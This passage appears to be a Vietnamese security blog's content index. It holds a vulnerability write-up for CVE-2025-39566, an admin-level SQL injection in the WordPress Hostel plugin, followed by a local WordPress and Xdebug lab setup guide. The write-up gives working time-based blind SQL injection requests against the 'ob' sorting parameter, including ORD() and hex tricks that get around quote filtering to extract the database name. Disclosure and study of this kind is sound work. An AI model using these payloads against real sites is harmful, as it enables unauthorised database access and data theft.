is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C·∫•u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } {: file=\u0026ldquo;models/hostel.php\u0026rdquo; v1.1.5.6 }\n·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() {: file=\u0026ldquo;hostel.php\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ lo·∫°i b·ªè/escape HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nAutomated Extraction Vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông h√≥a qu√° tr√¨nh t·∫•n c√¥ng: Script\nRemediation C·∫≠p nh·∫≠t l√™n Hostel Plugin v1.1.5.7 ho·∫∑c m·ªõi h∆°n\nTakeaways sanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-25-cve-2025-39566/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eSummary\u003c/strong\u003e: Plugin Hostel, d√πng ƒë·ªÉ qu·∫£n l√Ω ƒë·∫∑t ph√≤ng tr√™n WordPress, ch·ª©a l·ªói SQL Injection t·∫°i tham s·ªë \u003ccode\u003eob\u003c/code\u003e trong ph·∫ßn \u003cstrong\u003eManage Bookings\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"background\"\u003eBackground\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e cho ph√©p t·∫°o trang web nh√† tr·ªç, kh√°ch s·∫°n nh·ªè ho·∫∑c BnB b·∫±ng WordPress. N√≥ cung c·∫•p:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eForm ƒë·∫∑t ph√≤ng\u003c/li\u003e\n\u003cli\u003eL·ªãch ph√≤ng\u003c/li\u003e\n\u003cli\u003eQu·∫£n l√Ω bookings\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch3 id=\"requirements\"\u003eRequirements\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"code-comparison\"\u003eCode Comparison\u003c/h3\u003e\n\u003cp\u003eS·ª≠ d·ª•ng diff tool so s√°nh s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/p\u003e","title":"CVE-2025-39566"},{"content":"Introduction WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure 